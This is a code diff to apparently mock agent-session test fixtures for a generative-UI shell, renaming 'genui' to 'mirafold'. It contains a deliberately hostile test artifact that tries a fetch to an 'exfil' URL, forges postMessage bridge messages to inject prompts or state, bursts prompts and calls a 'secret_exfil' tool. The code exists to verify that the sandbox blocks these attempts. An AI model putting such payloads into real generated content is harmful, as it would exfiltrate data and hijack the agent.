@@ -130,7 +130,7 @@ export type WireMsg = { type: "text_delta"; text: string };
 | links | open in new tab |
 
 To go live, connect your agent's credentials (see the demo banner above) and
-restart genui-shell.`;
+restart Mirafold.`;
 
 const analyticsTemplate = () => {
   const project = pick(PROJECTS);
@@ -332,10 +332,10 @@ const HOSTILE_ARTIFACT =
   "document.addEventListener('securitypolicyviolation',function(e){set('csp','csp-violation:'+(e.effectiveDirective||e.violatedDirective))});" +
   "try{fetch('https://example.com/exfil').then(function(){set('csp','FETCH-SUCCEEDED')},function(){})}catch(e){}" +
   // Escape 4: forged bridge messages — unstamped and wrong-nonce state op.
-  "try{parent.postMessage({genui:1,action:{kind:'prompt',text:'forged-unstamped-prompt'}},'*')}catch(e){}" +
-  "try{parent.postMessage({genui:1,nonce:'guessed',action:{kind:'state',op:'set',key:'x',value:'y'}},'*')}catch(e){}" +
+  "try{parent.postMessage({mirafold:1,action:{kind:'prompt',text:'forged-unstamped-prompt'}},'*')}catch(e){}" +
+  "try{parent.postMessage({mirafold:1,nonce:'guessed',action:{kind:'state',op:'set',key:'x',value:'y'}},'*')}catch(e){}" +
   // Escape 5: an action burst — the 400ms rate limit must drop the second.
-  "genui.prompt('burst-alpha');genui.prompt('burst-beta');" +
+  "mirafold.prompt('burst-alpha');mirafold.prompt('burst-beta');" +
   "set('sent','attacks-sent');" +
   "</script>";
 
@@ -540,11 +540,11 @@ export class MockSession implements AgentSession {
             "</div>" +
             "<script>" +
             "let n=0;document.getElementById('b').onclick=()=>{document.getElementById('n').textContent=++n};" +
-            "document.getElementById('ls').onclick=()=>genui.tool('workspace_ls');" +
+            "document.getElementById('ls').onclick=()=>mirafold.tool('workspace_ls');" +
             // Off-allowlist via the helper: must reach the server and be
             // rejected THERE (raw un-nonced postMessage dies client-side).
-            "document.getElementById('evil').onclick=()=>genui.tool('secret_exfil');" +
-            "document.getElementById('ask').onclick=()=>genui.prompt('Tell me more about this workspace.');" +
+            "document.getElementById('evil').onclick=()=>mirafold.tool('secret_exfil');" +
+            "document.getElementById('ask').onclick=()=>mirafold.prompt('Tell me more about this workspace.');" +
             "</script>" +
             "</div>",
           id: randomUUID(),
